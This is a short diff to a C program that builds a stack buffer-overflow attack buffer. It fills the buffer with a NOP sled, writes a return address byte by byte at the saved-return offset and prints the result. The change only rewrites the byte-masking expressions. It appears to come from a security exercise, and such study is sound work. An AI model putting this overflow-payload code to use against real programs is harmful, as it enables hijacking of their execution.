@@ -22,10 +22,10 @@ main ( int argc, char * argv[] )
 	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
 		attack_buffer[i] = 0x90;
 
-	attack_buffer[BUF_TO_RET + 3] = (char) (BUF_ADDR & 0xff);
-	attack_buffer[BUF_TO_RET + 2] = (char) (((BUF_ADDR & 0x0000ff00) >> 8) & 0xff);
-	attack_buffer[BUF_TO_RET + 1] = (char) (((BUF_ADDR & 0x00ff0000) >> 16) & 0xff);
-	attack_buffer[BUF_TO_RET] = (char) ((BUF_ADDR & 0xff000000) >> 24);
+	attack_buffer[BUF_TO_RET + 3] = (char) (BUF_ADDR & 0xFF);
+	attack_buffer[BUF_TO_RET + 2] = (char) ((BUF_ADDR & 0x0000FF00) >> 8);
+	attack_buffer[BUF_TO_RET + 1] = (char) ((BUF_ADDR & 0x00FF0000) >> 16);
+	attack_buffer[BUF_TO_RET] = (char) ((BUF_ADDR & 0xFF000000) >> 24);
 	attack_buffer[BUF_TO_RET + 4] = '\0';
 
 	printf("attack_buffer %s\n",attack_buffer);
